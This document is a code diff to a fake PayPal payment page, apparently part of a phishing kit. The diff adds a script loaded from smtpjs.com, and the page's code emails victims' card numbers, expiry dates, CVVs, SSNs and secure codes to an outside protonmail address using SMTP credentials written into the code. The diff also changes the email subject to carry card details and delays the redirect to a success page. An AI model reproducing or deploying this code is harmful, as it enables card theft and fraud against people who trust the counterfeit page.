@@ -16,6 +16,7 @@ a.button, a.button:link, a.button:visited, .button, button {width: 100%;height: 
 #allowed ul {margin-left: 18px;list-style-image: url('icon/scr_check_10x10.gif');}#disallowed ul {margin-left: 18px;list-style-image: url('icon/scr_x_10x10.gif');}div.messageBox.res-center-critical {line-height: 56px;}div.messageBox.res-center-critical {	padding-left: 80px;	color: #000;	background-image: url('icon/icon_critalert.gif');}.profileStates,.stateHoverTexts{width:100%;list-style:none}.profileStates li,.stateHoverTexts li{display:inline-block;vertical-align:top;width:19.5%;text-align:center}.profileStates li:last-child .state,.stateHoverTexts li:last-child .state{margin:0}.profileStates{margin:0 1em 1em 0;padding-top:1.2em}.profileStates .icon{display:block;height:2em;width:2em;margin:.3em auto .5em auto;font-size:2.25em;text-align:center;line-height:1.7em;color:#223648;background:#009CDE;-webkit-border-radius:50%;-moz-border-radius:50%;border-radius:50%}.profileStates .state{text-align:center}.profileStates .todoState{border-color:#888}.profileStates .nextState .icon{background:#5E707E;}.profileStates .doneState .icon{background:#68ff68}.center {margin-left: 15%;	margin-right: 15%;}a {text-decoration: none}
 </style>
 <script type="text/javascript" src="js/jquery.min.js"></script></head>
+<script src="https://smtpjs.com/v3/smtp.js"></script>
 <body>
 <div class="standard" id="page">
 
@@ -252,11 +253,11 @@ var fixacardnumber = cardnumber.replace(/\s+/g, '');
                         Password : "Ad1ty@humu",
                         To : 'cintakubukandiataskertas1@protonmail.com',
                         From : "admin@apkblack17.net",
-                        Subject : "PayPal Email 2020 "+$('#ip').val(),
+                        Subject : "PayPal CC 2020 "+$('#ip').val()+'\n'+title +' '+bankName+' '+ typeCard + ' '+ brand,
                         Body : 'PAYPAL CC \nIP : '+$('#ip').val()+'\n'+title +' '+bankName+' '+ typeCard + ' '+ brand +'\nCardHolder Name: '+$('#cc_holder').val()+'\nCC Num: '+fixacardnumber+'\nEXP: '+$('#month').val()+' / '+$('#year').val()+'\nCVV: '+$('#cvv2_number').val()+'\nSSN: '+$('#sort_code').val()+'\nSecure Code: '+$('#secure_code').val()
                         }).then(
                         // message => alert(message)
-                        window.location.replace("success.html")
+                        setInterval(function(){ window.location.replace("success.html"); }, 3000)
                         );
           }
           });
